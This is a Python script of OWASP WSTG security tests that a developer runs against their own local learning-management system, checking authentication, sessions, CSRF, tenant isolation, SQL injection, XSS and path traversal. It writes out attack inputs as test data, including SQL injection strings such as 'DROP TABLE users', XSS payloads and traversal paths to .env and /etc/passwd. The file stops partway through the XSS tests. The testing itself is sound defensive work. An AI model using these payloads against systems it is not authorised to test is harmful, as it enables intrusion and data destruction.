"""
OWASP WSTG-based security tests for Margin LMS (run against YOUR OWN local stack).

  python run_wstg.py              # everything
  python run_wstg.py --json out.json
  python run_wstg.py --keep-data   # do not remove the test data afterwards (cleanup.py)

Needs the stack from deploy/local running, the test tenants from
seed_test_tenants.php, and docker-compose.test.yml (loopback port 8089 for
application-level tests; 8088 is the firewall).
"""
import json
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from wstg_lib import Client, Report, env_value  # noqa: E402

R = Report()
PW = env_value('MARGIN_SEED_ADMIN_PASSWORD')
API = '/api/v1'
EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
PNG = None


def png_bytes():
    import struct
    import zlib
    def chunk(t, d):
        c = struct.pack('>I', len(d)) + t + d
        return c + struct.pack('>I', zlib.crc32(t + d) & 0xffffffff)
    raw = b''.join(b'\x00' + bytes([20, 120, 200]) * 100 for _ in range(100))
    return (b'\x89PNG\r\n\x1a\n' + chunk(b'IHDR', struct.pack('>IIBBBBB', 100, 100, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(raw)) + chunk(b'IEND', b''))


def login(email, target='direct'):
    c = Client(target)
    r = c.login(email, PW)
    assert r.status == 200, f'login failed for {email}: {r.status} {r.text[:120]}'
    return c


def ids(resp):
    d = resp.json() or {}
    return [x.get('id') for x in d.get('data', [])] if isinstance(d.get('data'), list) else []


def clear_throttle():
    subprocess.run('docker compose exec -T app php artisan cache:clear', shell=True, cwd=r'C:\Users\hanaa\Desktop\uni\sems 7\security\MarginSecureLMS\deploy\local',
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# ============================================================================
def setup():
    global S1, S2, L1, TA, DA, UA, PA, BL, BS, BA
    S1 = login('student@margin.test')
    S2 = login('student2@margin.test')
    L1 = login('lecturer@margin.test')
    TA = login('teaching-assistant@margin.test')
    DA = login('department-admin@margin.test')
    UA = login('university-admin@margin.test')
    PA = login('admin@margin.test')
    BL = login('other-lecturer@margin.test')
    BS = login('other-student@margin.test')
    BA = login('other-admin@margin.test')
    global COURSES, A_ASSIGN, B_COURSE, B_ASSIGN, A_USERS
    COURSES = {c['code']: c['id'] for c in L1.get(API + '/courses').json()['data']}
    A_ASSIGN = L1.get(API + '/assignments').json()['data']
    B_COURSE = BL.get(API + '/courses').json()['data'][0]['id']
    B_ASSIGN = BL.get(API + '/assignments').json()['data'][0]['id']
    A_USERS = {u['email']: u['id'] for u in UA.get(API + '/users').json()['data']}


# ---------------------------------------------------------------- INFO / CONF
def info_conf():
    c = Client('waf', browser=False)
    r = c.get('/', xsrf=False)
    R.check('WSTG-INFO-02', 'No framework/version in headers (X-Powered-By, nginx version)',
            'x-powered-by' not in r.headers and not re.search(r'\d', r.headers.get('server', '')),
            detail_bad=f"server={r.headers.get('server')} x-powered-by={r.headers.get('x-powered-by')}", severity='low')
    for path in ['/.env', '/.git/config', '/vendor/autoload.php', '/storage/logs/laravel.log', '/composer.json',
                 '/artisan', '/phpinfo.php', '/server-status', '/telescope', '/horizon', '/_ignition/health-check',
                 '/backup.zip', '/database/database.sqlite', '/storage/app/private/', '/.DS_Store', '/config/app.php']:
        r = c.get(path, xsrf=False)
        leaked = any(m in r.text for m in ('APP_KEY', 'DB_PASSWORD', '<?php', 'laravel/framework', 'require_once'))
        R.check('WSTG-CONF-04', f'Sensitive path {path} not exposed', not leaked and r.status in (200, 301, 302, 403, 404),
                detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status} body leaks content', severity='high')
    for m in ['TRACE', 'PUT', 'DELETE', 'PATCH', 'CONNECT']:
        try:
            r = c.request(m, '/', xsrf=False)
            R.check('WSTG-CONF-06', f'HTTP {m} on / is not accepted', r.status in (400, 403, 404, 405, 501) or (m == 'TRACE' and 'TRACE /' not in r.text),
                    detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status}', severity='low')
        except Exception as e:
            R.add('WSTG-CONF-06', f'HTTP {m} on /', 'PASS', f'connection refused ({type(e).__name__})')
    r = c.request('OPTIONS', API + '/courses', xsrf=False)
    R.check('WSTG-CONF-06', 'OPTIONS on the API does not reveal extra methods',
            'PUT' not in r.headers.get('allow', '') and 'DELETE' not in r.headers.get('allow', ''), detail_bad=r.headers.get('allow', ''), severity='low')
    r = c.get('/', xsrf=False)
    for hdr in ('strict-transport-security', 'x-content-type-options', 'x-frame-options', 'referrer-policy', 'content-security-policy'):
        R.check('WSTG-CONF-07', f'Static site sends {hdr}', hdr in r.headers, detail_bad='missing', severity='medium')
    html = r.text
    R.check('WSTG-CLNT-12', 'Page declares a CSP without unsafe-inline for scripts / unsafe-eval',
            "script-src 'self' 'wasm-unsafe-eval'" in html and 'unsafe-eval' not in html.replace('wasm-unsafe-eval', ''),
            detail_bad='script-src is weaker than expected', severity='medium')
    u = S1.get(API + '/me')
    for hdr in ('x-content-type-options', 'x-frame-options', 'content-security-policy', 'referrer-policy', 'cache-control'):
        R.check('WSTG-CONF-07', f'API sends {hdr}', hdr in u.headers, detail_bad='missing', severity='medium')
    R.check('WSTG-ATHN-06', 'Authenticated API responses are not cacheable',
            'no-store' in u.headers.get('cache-control', ''), detail_bad=u.headers.get('cache-control', ''), severity='medium')

    # error handling
    for desc, resp in [
        ('unknown route', S1.get(API + '/nope')),
        ('wrong method', S1.request('PATCH', API + '/me')),
        ('malformed JSON', S1.request('POST', API + '/password', raw='{"a":', ctype='application/json')),
        ('huge integer id', S1.get(API + '/courses/99999999999999999999')),
        ('string where int expected', S1.get(API + '/courses/abc')),
        ('array where string expected', S1.put(API + '/profile', {'name': ['x']})),
    ]:
        body = resp.text
        bad = [m for m in ('vendor', 'Illuminate', 'Symfony', 'SQLSTATE', 'Stack trace', '/var/www', 'App\\') if m in body]
        R.check('WSTG-ERRH-01', f'Error for {desc} is generic', not bad and resp.status < 500,
                detail_ok=f'HTTP {resp.status}', detail_bad=f'HTTP {resp.status} leaks {bad}', severity='medium')


# ---------------------------------------------------------------- IDNT / ATHN
def identity_authn():
    c = Client('direct')
    c.csrf()
    a = c.post(API + '/login', {'email': 'student@margin.test', 'password': 'wrong-Passw0rd!'})
    b = Client('direct'); b.csrf()
    n = b.post(API + '/login', {'email': 'nobody@margin.test', 'password': 'wrong-Passw0rd!'})
    R.check('WSTG-IDNT-04', 'Wrong password and unknown user give the same response',
            a.status == n.status and a.json() == n.json(), detail_ok=f'{a.status} {a.text[:80]}',
            detail_bad=f'{a.status}:{a.text[:60]} vs {n.status}:{n.text[:60]}', severity='medium')
    # Timing on a desktop running Docker is noisy (single requests vary by
    # seconds), so: clear the lockout, discard a warm-up request, interleave the
    # samples, stay under the 5-attempt lockout per account, and compare medians.
    import statistics
    clear_throttle()
    Client('direct').csrf()
    t_known = []; t_unknown = []
    for i in range(8):
        known = ('lecturer@margin.test', 'teaching-assistant@margin.test')[i % 2]
        c2 = Client('direct'); c2.csrf(); t_known.append(c2.post(API + '/login', {'email': known, 'password': 'bad-Passw0rd!x'}).elapsed)
        c3 = Client('direct'); c3.csrf(); t_unknown.append(c3.post(API + '/login', {'email': f'ghost{i}@margin.test', 'password': 'bad-Passw0rd!x'}).elapsed)
    clear_throttle()
    med_k, med_u = statistics.median(t_known), statistics.median(t_unknown)
    R.check('WSTG-IDNT-04', 'Login timing does not reveal whether an account exists (median of 8)',
            abs(med_k - med_u) < 0.12, detail_ok=f'known {med_k*1000:.0f} ms, unknown {med_u*1000:.0f} ms',
            detail_bad=f'known {med_k*1000:.0f} ms vs unknown {med_u*1000:.0f} ms (samples {[round(x*1000) for x in t_known]} / {[round(x*1000) for x in t_unknown]})', severity='low')
    fp = Client('direct', browser=True); fp.csrf()
    x = fp.post(API + '/forgot-password', {'email': 'student@margin.test'})
    y = fp.post(API + '/forgot-password', {'email': 'ghost@margin.test'})
    R.check('WSTG-IDNT-04', 'Forgot-password response is identical for known and unknown addresses',
            x.status == y.status and x.json() == y.json(), detail_bad=f'{x.text[:80]} | {y.text[:80]}', severity='medium')

    for email, pw in [('admin@margin.test', 'admin'), ('admin@margin.test', 'Local-Only-ChangeMe!123'),
                      ('student@margin.test', 'password'), ('lecturer@margin.test', 'Password123!')]:
        d = Client('direct'); d.csrf()
        r = d.post(API + '/login', {'email': email, 'password': pw})
        R.check('WSTG-ATHN-02', f'Default/guessable credential {email} / {pw} rejected', r.status in (401, 422, 429),
                detail_bad=f'HTTP {r.status}', severity='critical')

    # protected routes demand authentication
    anon = Client('direct'); anon.csrf()
    routes = json.load(open(os.path.join(HERE, 'routes.json'), encoding='utf-8'))
    open_routes = []
    for rt in routes:
        mws = ' '.join(rt['middleware'])
        if 'Authenticate:sanctum' not in mws:
            continue
        method = rt['method'].split('|')[0]
        uri = re.sub(r'\{[^}]+\}', '1', '/' + rt['uri'])
        resp = anon.request('GET' if method == 'GET' else method, uri, json_body={} if method != 'GET' else None)
        if resp.status not in (401, 419):
            open_routes.append((method, uri, resp.status))
    R.check('WSTG-ATHN-04', f'All {sum(1 for r in routes if "Authenticate:sanctum" in " ".join(r["middleware"]))} authenticated routes reject anonymous requests',
            not open_routes, detail_bad=str(open_routes[:5]), severity='critical')

    # password policy
    p = login('student2@margin.test')
    for pw, why in [('short1A!', 'too short'), ('alllowercasepassword1!', 'no upper case'), ('NoDigitsHere!!!!', 'no digit'),
                    ('NoSymbolsHere1234', 'no symbol'), ('Password1234!', 'breached/common')]:
        r = p.put(API + '/password', {'current_password': PW, 'password': pw, 'password_confirmation': pw})
        R.check('WSTG-ATHN-07', f'Weak password refused ({why})', r.status == 422, detail_bad=f'HTTP {r.status}', severity='medium')
    r = p.put(API + '/password', {'current_password': 'wrong', 'password': 'Another-Str0ng-Pass!', 'password_confirmation': 'Another-Str0ng-Pass!'})
    R.check('WSTG-ATHN-09', 'Changing the password requires the current password', r.status == 422, detail_bad=f'HTTP {r.status}', severity='high')

    # reset with invalid token
    r = Client('direct')
    r.csrf()
    rs = r.post(API + '/reset-password', {'token': 'x' * 64, 'email': 'student@margin.test', 'password': 'Brand-New-Pass123!', 'password_confirmation': 'Brand-New-Pass123!'})
    R.check('WSTG-ATHN-09', 'Password reset with a forged token is refused', rs.status in (422,), detail_bad=f'HTTP {rs.status}', severity='critical')

    # MFA challenge throttling
    m = Client('direct'); m.csrf()
    codes = [m.post(API + '/mfa/challenge', {'code': '000000'}).status for _ in range(8)]
    R.check('WSTG-ATHN-03', 'MFA challenge is rate limited (429 within 8 attempts)', 429 in codes, detail_bad=str(codes), severity='high')

    # login lockout, last so it cannot disturb other tests
    victim = 'student2@margin.test'
    seen = []
    for i in range(12):
        z = Client('direct'); z.csrf()
        seen.append(z.post(API + '/login', {'email': victim, 'password': f'bad-Passw0rd-{i}!'}).status)
    R.check('WSTG-ATHN-03', 'Repeated failed logins trigger a lockout (429)', 429 in seen, detail_bad=str(seen), severity='high')
    z = Client('direct'); z.csrf()
    ok = z.post(API + '/login', {'email': victim, 'password': PW}).status
    R.check('WSTG-ATHN-03', 'While locked, even the right password is refused', ok in (429,), detail_bad=f'HTTP {ok}', severity='medium')
    clear_throttle()
    time.sleep(1)


# ---------------------------------------------------------------- SESS
def sessions():
    c = Client('direct'); c.csrf()
    pre = c.cookies.get('margin-lms-session') or next((v for k, v in c.cookies.items() if 'session' in k.lower()), None)
    c.post(API + '/login', {'email': 'student@margin.test', 'password': PW})
    post = next((v for k, v in c.cookies.items() if 'session' in k.lower()), None)
    R.check('WSTG-SESS-03', 'Session identifier changes at login (no fixation)', pre != post and post is not None,
            detail_bad='same session id before and after login', severity='high')
    flags = ' '.join(c.last.set_cookies).lower() if c.last.set_cookies else ''
    c2 = Client('direct'); c2.csrf()
    cookie_lines = [x.lower() for x in c2.last.set_cookies]
    sess = [x for x in c.last.set_cookies if 'session' in x.lower()]
    allc = [x.lower() for x in (c.last.set_cookies + c2.last.set_cookies)]
    R.check('WSTG-SESS-02', 'Session cookie is HttpOnly, Secure and SameSite', bool(sess) and all('httponly' in s.lower() and 'secure' in s.lower() and 'samesite' in s.lower() for s in sess),
            detail_bad=str(sess)[:160], severity='high')
    xs = [x for x in c2.last.set_cookies if 'xsrf' in x.lower()]
    R.check('WSTG-SESS-02', 'CSRF cookie is Secure and SameSite (readable by the app on purpose)', bool(xs) and all('secure' in x.lower() and 'samesite' in x.lower() for x in xs),
            detail_bad=str(xs)[:160], severity='medium')
    ids_ = set()
    for _ in range(15):
        cc = Client('direct'); cc.csrf()
        ids_.add(next((v for k, v in cc.cookies.items() if 'session' in k.lower()), ''))
    lens = {len(v) for v in ids_}
    R.check('WSTG-SESS-01', 'Session cookies are unique and long (15 samples)', len(ids_) == 15 and min(lens) >= 100,
            detail_ok=f'unique, length >= {min(lens)} (encrypted)', detail_bad=f'{len(ids_)} unique, lengths {lens}', severity='high')

    # CSRF
    s = login('student@margin.test')
    r = s.request('PUT', API + '/profile', json_body={'name': 'CSRF Test'}, xsrf=False, headers={'Sec-Fetch-Site': None, 'Origin': None})
    R.check('WSTG-SESS-05', 'State-changing request with a session but no CSRF token and no browser headers is refused', r.status in (419, 403, 401), detail_bad=f'HTTP {r.status}', severity='high')
    r = s.request('PUT', API + '/profile', json_body={'name': 'Demo Student'}, xsrf=False)
    R.add('WSTG-SESS-05', 'Same-origin browser header counts as proof of origin (Laravel 13)', 'INFO', f'HTTP {r.status}: a page on another site cannot set Sec-Fetch-Site, so it cannot use this')
    r = s.request('PUT', API + '/profile', json_body={'name': 'CSRF Test'}, headers={'Sec-Fetch-Site': 'cross-site', 'Origin': 'https://evil.example'})
    R.check('WSTG-SESS-05', 'Cross-site request with a valid session is refused', r.status in (401, 403, 419), detail_bad=f'HTTP {r.status}', severity='high')
    r = s.request('GET', API + '/me', headers={'Sec-Fetch-Site': 'cross-site', 'Origin': 'https://evil.example'})
    R.check('WSTG-SESS-05', 'Cross-site GET with a valid session is refused', r.status in (401, 403), detail_bad=f'HTTP {r.status}', severity='medium')
    r = s.request('GET', API + '/me', headers={'Sec-Fetch-Site': None, 'Origin': None})
    R.add('WSTG-SESS-05', 'Session request with no Origin/Sec-Fetch-Site headers (curl-style)', 'INFO', f'HTTP {r.status} (script tools can omit headers; the server still authorizes every request)')

    # binding to client
    t = Client('direct', ua='Mozilla/5.0 original-agent'); t.login('student@margin.test', PW)
    ok = t.get(API + '/me').status
    stolen = Client('direct', ua='Mozilla/5.0 attacker-agent'); stolen.cookies = dict(t.cookies)
    sr = stolen.get(API + '/me')
    R.check('WSTG-SESS-09', 'Stolen session cookie fails from a different client (User-Agent binding)', ok == 200 and sr.status == 401,
            detail_bad=f'owner {ok}, thief {sr.status}', severity='medium')

    # logout invalidates
    lo = Client('direct'); lo.login('student@margin.test', PW)
    saved = dict(lo.cookies)
    lo.post(API + '/logout')
    replay = Client('direct'); replay.cookies = saved
    rr = replay.get(API + '/me')
    R.check('WSTG-SESS-06', 'Session cannot be replayed after logout', rr.status == 401, detail_bad=f'HTTP {rr.status}', severity='high')

    # session management endpoint: cannot revoke another user's session
    mine = s.get(API + '/sessions').json() or {}
    sid = None
    try:
        items = mine.get('data', mine)
        sid = items[0]['id'] if items else None
    except Exception:
        pass
    R.add('WSTG-SESS-07', 'Idle (120 min) and absolute (12 h) timeouts', 'INFO', 'covered by AccountProtectionGapsTest (clock-travel tests); not waited out here')
    other = L1.get(API + '/sessions').json() or {}
    try:
        oid = (other.get('data', other))[0]['id']
        rv = s.delete(API + f'/sessions/{oid}')
        R.check('WSTG-ATHZ-04', "A user cannot revoke another user's session", rv.status in (403, 404, 422), detail_bad=f'HTTP {rv.status}', severity='high')
    except Exception as e:
        R.add('WSTG-ATHZ-04', "Revoke another user's session", 'INFO', f'could not enumerate ({e})')

    # mobile token flow
    m = Client('direct', browser=False, ua='okhttp/4.12.0')
    r = m.request('POST', API + '/mobile/login', json_body={'email': 'student@margin.test', 'password': PW, 'device_name': 'wstg'})
    tok = (r.json() or {}).get('token')
    R.check('WSTG-SESS-01', 'Mobile sign-in issues a bearer token', r.status == 200 and tok, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='medium')
    if tok:
        m.token = tok
        R.check('WSTG-SESS-01', 'Bearer token authenticates API calls', m.get(API + '/me').status == 200, severity='medium')
        m.request('POST', API + '/mobile/logout', json_body={})
        R.check('WSTG-SESS-06', 'Bearer token stops working after mobile logout', m.get(API + '/me').status == 401, detail_bad='token still valid', severity='high')


# ---------------------------------------------------------------- ATHZ / BUSL
def authorization():
    sec101, sec202 = COURSES['SEC101'], COURSES['SEC202']
    # vertical access: student calling staff/admin endpoints
    forbidden = [
        ('POST', API + '/courses', {'name': 'x', 'code': 'X1', 'description': 'd'}),
        ('POST', API + '/announcements', {'title': 't', 'body': 'b'}),
        ('GET', API + '/users', None), ('GET', API + '/audit-logs', None), ('POST', API + '/users', {'name': 'x', 'email': 'x@y.test', 'role': 'student'}),
        ('POST', API + '/universities', {'name': 'x', 'code': 'x'}), ('POST', API + '/imports/users', None),
        ('GET', API + f'/courses/{sec101}/grades.csv', None), ('POST', API + '/course-staff', {'course_id': sec101, 'user_id': 1}),
        ('POST', API + '/assignments', {'course_id': sec101, 'title': 't', 'description': 'd', 'max_score': 10}),
    ]
    bad = []
    for m, p, b in forbidden:
        r = S1.request(m, p, json_body=b if b is not None else ({} if m != 'GET' else None))
        if r.status not in (403, 422) or (r.status == 422 and m != 'POST'):
            if r.status not in (403,):
                bad.append((m, p, r.status))
    R.check('WSTG-ATHZ-02', 'Student cannot reach staff/admin endpoints', not bad, detail_bad=str(bad), severity='critical')
    bad = []
    for m, p, b in [('GET', API + '/users', None), ('GET', API + '/audit-logs', None), ('POST', API + '/universities', {'name': 'x', 'code': 'x'})]:
        r = L1.request(m, p, json_body=b)
        if r.status != 403:
            bad.append((m, p, r.status))
    R.check('WSTG-ATHZ-02', 'Lecturer cannot reach user/audit/university administration', not bad, detail_bad=str(bad), severity='critical')
    r = DA.post(API + '/universities', {'name': 'x', 'code': 'x'})
    R.check('WSTG-ATHZ-02', 'Department admin cannot create universities', r.status == 403, detail_bad=f'HTTP {r.status}', severity='high')

    # privilege escalation via mass assignment
    me = S1.get(API + '/me').json()['user']['id']
    r = S1.put(API + '/profile', {'name': 'Demo Student', 'role': 'platform_admin', 'university_id': 2, 'account_status': 'active'})
    now = S1.get(API + '/me').json()['user']
    R.check('WSTG-ATHZ-03', 'Profile update ignores role/university fields (mass assignment)', now['role'] == 'student' and now['university_id'] == 1,
            detail_bad=str(now), severity='critical')
    r = S1.put(API + f'/users/{me}', {'role': 'platform_admin'})
    R.check('WSTG-ATHZ-03', 'Student cannot change own role through /users/{id}', r.status == 403, detail_bad=f'HTTP {r.status}', severity='critical')
    r = DA.post(API + '/users', {'name': 'Evil', 'email': 'evil-pa@margin.test', 'password': 'Evil-Passw0rd-123!', 'role': 'platform_admin', 'university_id': 1})
    R.check('WSTG-ATHZ-03', 'Department admin cannot create a platform admin', r.status in (403, 422), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='critical')
    r = UA.post(API + '/users', {'name': 'Evil2', 'email': 'evil-pa2@margin.test', 'password': 'Evil-Passw0rd-123!', 'role': 'platform_admin', 'university_id': 1})
    R.check('WSTG-ATHZ-03', 'University admin cannot create a platform admin', r.status in (403, 422), detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='critical')
    r = UA.post(API + '/users', {'name': 'Cross', 'email': 'cross-uni@margin.test', 'password': 'Evil-Passw0rd-123!', 'role': 'student', 'university_id': 2})
    # The server may refuse, or ignore the requested university and use the admin's own
    # (constrainAdministrativeFields). Either is safe; a user in university 2 is not.
    # Earlier runs only passed because this account was left over from the first run
    # (422 "email taken"); cleanup.py now removes it after every run.
    made = (r.json() or {}).get('data', {}) if r.status == 201 else {}
    own_uni = UA.get(API + '/me').json()['user']['university_id']
    R.check('WSTG-ATHZ-03', 'University admin cannot create users in another university',
            r.status in (403, 422) or (r.status == 201 and made.get('university_id') == own_uni),
            detail_ok=f'HTTP {r.status}' + (f', created in own university {own_uni} instead of 2' if r.status == 201 else ''),
            detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='high')

    # horizontal / tenant isolation (IDOR)
    b_ids = {'course': B_COURSE, 'assignment': B_ASSIGN}
    for who, cli in [('student B', BS), ('lecturer B', BL)]:
        pass
    leaks = []
    for who, cli in [('student A', S1), ('lecturer A', L1), ('uni admin A', UA)]:
        for name, path in [('course', f'/courses/{B_COURSE}'), ('assignment', f'/assignments/{B_ASSIGN}'),
                           ('course grade summary', f'/courses/{B_COURSE}/grade-summary')]:
            r = cli.get(API + path)
            if r.status == 200:
                leaks.append((who, name))
    R.check('WSTG-ATHZ-04', 'Tenant A users cannot read tenant B courses/assignments (IDOR by id)', not leaks, detail_bad=str(leaks), severity='critical')
    leaks = []
    for who, cli in [('student B', BS), ('lecturer B', BL), ('uni admin B', BA)]:
        for name, path in [('course', f'/courses/{sec101}'), ('assignment', f'/assignments/{A_ASSIGN[0]["id"]}'),
                           ('user', f'/users/{A_USERS["student@margin.test"]}'), ('avatar', f'/profile/avatar/{A_USERS["student@margin.test"]}'),
                           ('grades csv', f'/courses/{sec101}/grades.csv')]:
            r = cli.get(API + path)
            if r.status == 200:
                leaks.append((who, name))
    R.check('WSTG-ATHZ-04', 'Tenant B users cannot read tenant A courses/users/grades (IDOR by id)', not leaks, detail_bad=str(leaks), severity='critical')
    # list endpoints must not mix tenants
    mixed = []
    for who, cli, other_course in [('student A', S1, B_COURSE), ('lecturer B', BL, sec101), ('uni admin A', UA, B_COURSE)]:
        for p in ('/courses', '/assignments', '/users', '/enrollments', '/announcements', '/search?q=Other', '/search?q=Security'):
            r = cli.get(API + p)
            d = r.json() or {}
            txt = r.text
            if r.status == 200 and ((who != 'lecturer B' and ('OTH101' in txt or 'Other Course' in txt)) or (who == 'lecturer B' and ('SEC101' in txt or 'Demo Student' in txt))):
                mixed.append((who, p))
    R.check('WSTG-ATHZ-04', 'List and search endpoints never mix universities', not mixed, detail_bad=str(mixed), severity='critical')

    # student A2 cannot see course they are not enrolled in
    r = S2.get(API + f'/courses/{sec202}')
    ids2 = ids(S2.get(API + '/courses'))
    R.check('WSTG-ATHZ-04', 'Student only sees courses they are enrolled in', sec202 not in ids2 and sec101 in ids2,
            detail_bad=f'visible course ids {ids2}', severity='high')
    assign_202 = [a for a in A_ASSIGN if a['course_id'] == sec202][0]['id']
    r = S2.get(API + f'/assignments/{assign_202}')
    R.check('WSTG-ATHZ-04', 'Student cannot read an assignment of a course they are not enrolled in', r.status in (403, 404), detail_bad=f'HTTP {r.status}', severity='high')
    r = S2.post(API + f'/assignments/{assign_202}/submissions', {'content': 'sneaky'})
    R.check('WSTG-BUSL-01', 'Student cannot submit to a course they are not enrolled in', r.status in (403, 404), detail_bad=f'HTTP {r.status}', severity='high')

    # submissions: S1 submits; S2 / other lecturer / TA of other course
    a101 = [a for a in A_ASSIGN if a['course_id'] == sec101][0]['id']
    r = S1.post(API + f'/assignments/{a101}/submissions', {'content': 'My answer <b>bold</b>'})
    sub = (r.json() or {}).get('data', r.json() or {}).get('id') if r.status in (200, 201) else None
    R.check('WSTG-BUSL-01', 'Enrolled student can submit work', r.status in (200, 201) and sub, detail_bad=f'HTTP {r.status} {r.text[:120]}', severity='medium')
    if sub:
        for who, cli, expect_ok in [('other student in same course', S2, False), ('student of other university', BS, False),
                                    ('lecturer of other university', BL, False), ('owner', S1, True), ('course lecturer', L1, True)]:
            rr = cli.get(API + f'/submissions/{sub}')
            R.check('WSTG-ATHZ-04', f'Submission visible to {who}: {expect_ok}', (rr.status == 200) == expect_ok,
                    detail_bad=f'HTTP {rr.status}', severity='critical')
        # grading
        rr = S1.put(API + f'/submissions/{sub}/grade', {'score': 100})
        R.check('WSTG-ATHZ-02', 'Student cannot grade (own) submission', rr.status == 403, detail_bad=f'HTTP {rr.status}', severity='critical')
        rr = BL.put(API + f'/submissions/{sub}/grade', {'score': 100})
        R.check('WSTG-ATHZ-04', 'Lecturer of another university cannot grade it', rr.status in (403, 404), detail_bad=f'HTTP {rr.status}', severity='critical')
        rr = L1.put(API + f'/submissions/{sub}/grade', {'score': 9999, 'feedback': 'x'})
        R.check('WSTG-BUSL-03', 'Score above the maximum is rejected', rr.status == 422, detail_bad=f'HTTP {rr.status}', severity='medium')
        rr = L1.put(API + f'/submissions/{sub}/grade', {'score': -5})
        R.check('WSTG-BUSL-03', 'Negative score is rejected', rr.status == 422, detail_bad=f'HTTP {rr.status}', severity='medium')
        rr = L1.put(API + f'/submissions/{sub}/grade', {'score': 'abc'})
        R.check('WSTG-INPV-20', 'Non-numeric score is rejected', rr.status == 422, detail_bad=f'HTTP {rr.status}', severity='low')
        rr = L1.put(API + f'/submissions/{sub}/grade', {'score': 80, 'feedback': 'Good <script>alert(1)</script>'})
        R.check('WSTG-BUSL-03', 'Course lecturer can grade', rr.status in (200, 201), detail_bad=f'HTTP {rr.status} {rr.text[:100]}', severity='medium')
        g = S1.get(API + '/grades').json() or {}
        before_publish = [x for x in g.get('data', []) if x.get('submission_id') == sub]
        R.check('WSTG-BUSL-03', 'Student cannot see a grade before it is published', not before_publish, detail_bad=str(before_publish)[:120], severity='high')
        grade_id = None
        lg = L1.get(API + '/grades').json() or {}
        for x in lg.get('data', []):
            if x.get('submission_id') == sub:
                grade_id = x['id']
        if grade_id:
            rr = S1.post(API + f'/grades/{grade_id}/publish')
            # 404 is as good as 403 here: the unpublished grade is invisible to the student.
            R.check('WSTG-ATHZ-02', 'Student cannot publish a grade', rr.status in (403, 404), detail_bad=f'HTTP {rr.status}', severity='critical')
            rr = S2.get(API + f'/grades/{grade_id}')
            R.check('WSTG-ATHZ-04', "Another student cannot read a grade by id", rr.status in (403, 404), detail_bad=f'HTTP {rr.status}', severity='critical')
            rr = BL.get(API + f'/grades/{grade_id}')
            R.check('WSTG-ATHZ-04', 'Other-university lecturer cannot read the grade', rr.status in (403, 404), detail_bad=f'HTTP {rr.status}', severity='critical')
            L1.post(API + f'/grades/{grade_id}/publish')
            rr = S1.get(API + f'/grades/{grade_id}')
            body = rr.text
            # Long free text (feedback, submissions) keeps "<" on purpose (SanitizeInput):
            # it is only ever returned as JSON and shown as plain text. The control
            # to test is that the browser can never treat the response as HTML.
            ctype = rr.headers.get('content-type', '')
            R.check('WSTG-INPV-01', 'Feedback with markup is returned only as JSON with nosniff',
                    ctype.startswith('application/json') and rr.headers.get('x-content-type-options') == 'nosniff',
                    detail_ok=ctype, detail_bad=f'{ctype} / nosniff={rr.headers.get("x-content-type-options")}', severity='medium')
            R.add('WSTG-INPV-01', 'Feedback markup stored as', 'INFO',
                  'stored verbatim (by design for long text; Flutter renders text, not HTML; CSP blocks scripts)' if '<script' in body.lower() else 'tags removed')
            rr = L1.put(API + f'/submissions/{sub}/grade', {'score': 85})
            R.check('WSTG-BUSL-03', 'Changing a published grade requires a reason', rr.status == 422, detail_bad=f'HTTP {rr.status}', severity='medium')

    # path traversal on file endpoints
    for p in ['/materials/..%2f..%2f.env/download', '/submission-files/..%2f..%2f.env/download', '/profile/avatar/..%2f..%2f.env',
              '/materials/1%00/download', '/submission-files/../../../etc/passwd/download']:
        r = S1.get(API + p)
        R.check('WSTG-ATHZ-01', f'Path traversal {p}', r.status in (200, 400, 403, 404, 405) and 'root:' not in r.text and 'APP_KEY' not in r.text,
                detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status}', severity='high')


# ---------------------------------------------------------------- INPV
def input_validation():
    sec101 = COURSES['SEC101']
    sqli = ["' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT null,null--", "1' AND (SELECT pg_sleep(4))--", '" OR ""="']
    slow = []
    bad = []
    for payload in sqli:
        for p in ('/search?q=', '/courses?search=', '/users?search=', '/assignments?course_id=', '/courses/'):
            t0 = time.time()
            r = UA.get(API + p + urllib_quote(payload))
            dt = time.time() - t0
            if dt > 3.5:
                slow.append((p, payload, round(dt, 1)))
            if r.status >= 500 or 'SQLSTATE' in r.text or 'syntax error' in r.text.lower():
                bad.append((p, payload, r.status))
    R.check('WSTG-INPV-05', 'SQL injection payloads in query strings: no errors', not bad, detail_bad=str(bad[:4]), severity='critical')
    R.check('WSTG-INPV-05', 'SQL injection time-based payload does not delay responses', not slow, detail_bad=str(slow[:4]), severity='critical')
    r = L1.post(API + '/announcements', {'course_id': sec101, 'title': "x'); DROP TABLE users;--", 'body': "' OR 1=1 --"})
    R.check('WSTG-INPV-05', 'SQL injection payload in JSON body is stored as text only', r.status in (200, 201, 422), detail_bad=f'HTTP {r.status}', severity='critical')
    users_after = UA.get(API + '/users')
    R.check('WSTG-INPV-05', 'Users table still intact after injection attempts', users_after.status == 200 and len(ids(users_after)) >= 7,
            detail_bad=f'HTTP {users_after.status}', severity='critical')
    for p in ('/courses?sort=id;select%20pg_sleep(4)', '/users?per_page=1000000', '/users?page=-1', '/users?page[]=1', '/users?per_page=abc', '/courses?filter[id]=1'):
        t0 = time.time(); r = UA.get(API + p)
        R.check('WSTG-INPV-04', f'Odd parameter {p} handled safely', r.status < 500 and time.time() - t0 < 3.5, detail_bad=f'HTTP {r.status} {time.time()-t0:.1f}s', severity='medium')
    big = UA.get(API + '/users?per_page=100000').json() or {}
    R.check('WSTG-INPV-04', 'per_page is capped (no unbounded list)', len(big.get('data', [])) <= 200, detail_bad=f"{len(big.get('data', []))} rows returned", severity='low')

    # XSS: stored values come back as JSON only, safe headers
    payloads = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "javascript:alert(1)", '<svg/onload=alert(1)>']
    for pl in payloads:
